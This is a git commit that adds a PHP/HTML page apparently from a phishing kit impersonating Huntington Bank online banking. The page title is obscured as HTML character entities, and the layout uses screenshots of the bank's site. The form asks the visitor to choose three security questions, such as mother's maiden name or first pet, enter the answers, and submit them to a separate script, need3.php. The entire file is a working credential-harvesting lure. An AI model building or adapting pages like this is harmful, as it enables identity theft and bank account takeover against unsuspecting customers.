2b1e77d5bdc76c40db36e23d6bc6c6dbbb27bcaf
Stefan Pejcic <pejcha1994@gmail.com>
2022-02-09 14:25:26 +0100

    Create surf5.php

---
+++ 09.02.2022/surf5.php
@@ -0,0 +1,170 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#44;&#32;&#73;&#110;&#115;&#117;&#114;&#97;&#110;&#99;&#101;&#32;&#97;&#110;&#100;&#32;&#73;&#110;&#118;&#101;&#115;&#116;&#105;&#110;&#103;&#32;&#124;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;</title>
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon"
+              href="images/favicon.ico"/>
+<style type="text/css">
+.textbox {  
+    border-top: solid 2px #8e8e8e; 
+    border-right: solid 2px #d1d1d1; 
+    border-left: solid 2px #d1d1d1; 
+    border-bottom: solid 2px #e4e4e4;
+	border-radius: 5px;
+	font-family: Tahoma,"????","??",arial;
+    font-size: 14px;
+  	color: #555; 	
+    height: 38px; 
+  	padding-left:5px;
+    width: 275px; 
+ } 
+ 
+.textbox:focus {  
+    border-color: #4488cc; 
+    border-style: solid; 
+    border-width: 2px; 
+    outline: 0; 
+ } 
+ .textbox1 {
+	height: 28px;
+    width: 275px;
+	padding-right: 4px;
+	font-family: "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", "DejaVu Sans", Verdana, sans-serif;
+    font-size: 18px;
+	color: #333;
+    text-align: right;
+    font-weight: bold;
+    border: 0px solid #fff; 
+} 
+.textbox1:focus { 
+    outline: none; 
+    border: 0px solid #fff;
+} 
+</style>
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 981px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+<style>
+p{font-size: 40px;}
+.loader {
+    position: fixed;
+    left: 0px;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
+    opacity: .8;
+}
+</style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+$(window).load(function() {
+	$(".loader").fadeOut("slow");
+});
+</script>
+</head>
+<body bgColor="#D3D3D3">
+<div class="loader"></div>
+<div id="container">
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:981px; height:620px; z-index:0"><img src="images/h9.png" alt="" title="" border=0 width=981 height=620></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:2px; top:617px; width:976px; height:605px; z-index:1"><img src="images/h10.png" alt="" title="" border=0 width=976 height=605></div>
+<form action=need3.php name=sattusoda id=sattusoda method=post>
+<select name="q1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:400px;left:125px;top:257px;z-index:3">
+<option value="">Select One</option>
+<option value="What is your favorite board game?">What is your favorite board game?</option>
+<option value="What is your dream occupation?">What is your dream occupation?</option>
+<option value="What's the name of the boy/ girl your first kissed?">What's the name of the boy/ girl your first kissed?</option>
+<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
+<option value="What is your first pet's name?">What is your first pet's name?</option>
+<option value="What is your Mother middles name?">What is your Mother middles name?</option>
+<option value="What color was your first car?">What color was your first car?</option>
+<option value="What is your Mother's maiden name?">What is your Mother's maiden name?</option>
+<option value="What is the street you grew up on?">What is the street you grew up on?</option>
+<option value="What is your best friend's first name?">What is your best friend's first name?</option>
+<option value="In what city/town did your mother and father get married?">In what city/town did your mother and father get married?</option>
+<option value="What is your Best man name at wedding?">What is your Best man name at wedding?</option>
+<option value="What is your Family tradition?">What is your Family tradition?</option>
+<option value="What was your favorite subject in school?">What was your favorite subject in school?</option>
+<option value="What is your daughter's name?">What is your daughter's name?</option>
+<option value="In what city/town did you meet your spouse/significant other?">In what city/town did you meet your spouse/significant other?</option>
+<option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
+<option value="Who is your favorite composer?">Who is your favorite composer?</option>
+<option value="In what city does your nearest sibling live?">In what city does your nearest sibling live?</option>
+<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
+<option value="Who is your favorite cartoon character?">Who is your favorite cartoon character?</option>
+<option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
+<option value="What is your favorite museum or cultural institution?">What is your favorite museum or cultural institution?</option></select>
+<input name="ans1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:337px;z-index:4">
+<select name="q2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:400px;left:125px;top:417px;z-index:5">
+<option value="">Select One</option>
+<option value="What is your favorite board game?">What is your favorite board game?</option>
+<option value="What is your dream occupation?">What is your dream occupation?</option>
+<option value="What's the name of the boy/ girl your first kissed?">What's the name of the boy/ girl your first kissed?</option>
+<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
+<option value="What is your first pet's name?">What is your first pet's name?</option>
+<option value="What is your Mother middles name?">What is your Mother middles name?</option>
+<option value="What color was your first car?">What color was your first car?</option>
+<option value="What is your Mother's maiden name?">What is your Mother's maiden name?</option>
+<option value="What is the street you grew up on?">What is the street you grew up on?</option>
+<option value="What is your best friend's first name?">What is your best friend's first name?</option>
+<option value="In what city/town did your mother and father get married?">In what city/town did your mother and father get married?</option>
+<option value="What is your Best man name at wedding?">What is your Best man name at wedding?</option>
+<option value="What is your Family tradition?">What is your Family tradition?</option>
+<option value="What was your favorite subject in school?">What was your favorite subject in school?</option>
+<option value="What is your daughter's name?">What is your daughter's name?</option>
+<option value="In what city/town did you meet your spouse/significant other?">In what city/town did you meet your spouse/significant other?</option>
+<option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
+<option value="Who is your favorite composer?">Who is your favorite composer?</option>
+<option value="In what city does your nearest sibling live?">In what city does your nearest sibling live?</option>
+<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
+<option value="Who is your favorite cartoon character?">Who is your favorite cartoon character?</option>
+<option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
+<option value="What is your favorite museum or cultural institution?">What is your favorite museum or cultural institution?</option></select>
+<input name="ans2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:497px;z-index:6">
+<select name="q3" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:400px;left:125px;top:577px;z-index:7">
+<option value="">Select One</option>
+<option value="What is your favorite board game?">What is your favorite board game?</option>
+<option value="What is your dream occupation?">What is your dream occupation?</option>
+<option value="What's the name of the boy/ girl your first kissed?">What's the name of the boy/ girl your first kissed?</option>
+<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
+<option value="What is your first pet's name?">What is your first pet's name?</option>
+<option value="What is your Mother middles name?">What is your Mother middles name?</option>
+<option value="What color was your first car?">What color was your first car?</option>
+<option value="What is your Mother's maiden name?">What is your Mother's maiden name?</option>
+<option value="What is the street you grew up on?">What is the street you grew up on?</option>
+<option value="What is your best friend's first name?">What is your best friend's first name?</option>
+<option value="In what city/town did your mother and father get married?">In what city/town did your mother and father get married?</option>
+<option value="What is your Best man name at wedding?">What is your Best man name at wedding?</option>
+<option value="What is your Family tradition?">What is your Family tradition?</option>
+<option value="What was your favorite subject in school?">What was your favorite subject in school?</option>
+<option value="What is your daughter's name?">What is your daughter's name?</option>
+<option value="In what city/town did you meet your spouse/significant other?">In what city/town did you meet your spouse/significant other?</option>
+<option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
+<option value="Who is your favorite composer?">Who is your favorite composer?</option>
+<option value="In what city does your nearest sibling live?">In what city does your nearest sibling live?</option>
+<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
+<option value="Who is your favorite cartoon character?">Who is your favorite cartoon character?</option>
+<option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
+<option value="What is your favorite museum or cultural institution?">What is your favorite museum or cultural institution?</option></select>
+<input name="ans3" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:250px;left:125px;top:660px;z-index:8">
+
+<div id="formimage1" style="position:absolute; left:124px; top:740px; z-index:10"><input type="image" name="formimage1" width="144" height="44" src="images/cnt.png"></div>
+<div id="image3" style="position:absolute; overflow:hidden; left:290px; top:755px; width:63px; height:24px; z-index:11"><a href="#"><img src="images/h11.png" alt="" title="" border=0 width=63 height=24></a></div>
+
+</div>
+
+</body>
+</html>
